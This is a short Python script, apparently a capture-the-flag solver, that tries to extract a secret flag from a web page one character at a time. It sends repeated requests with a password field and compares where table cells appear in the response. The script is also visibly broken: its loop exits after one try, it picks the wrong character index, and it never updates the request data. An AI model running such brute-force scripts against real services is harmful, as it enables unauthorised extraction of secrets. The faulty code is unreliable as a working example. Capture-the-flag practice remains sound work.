import requests
url=input()
cookie=input()
param=input()
str='-0123456789abcdefghijklmnopqrstuvwxyz{|}'
flag=""
data={
    'password':flag
}
for i in range(48):
    for j in range(len(str)):
        t=requests.get(url,data=data,params=param,cookies=cookie,timeout=1).text
        if t.find(f"<td>{flag}</td>")>t.find("<td>flag</td>"):
            flag=flag+str[j-1]
            print(flag)
        break
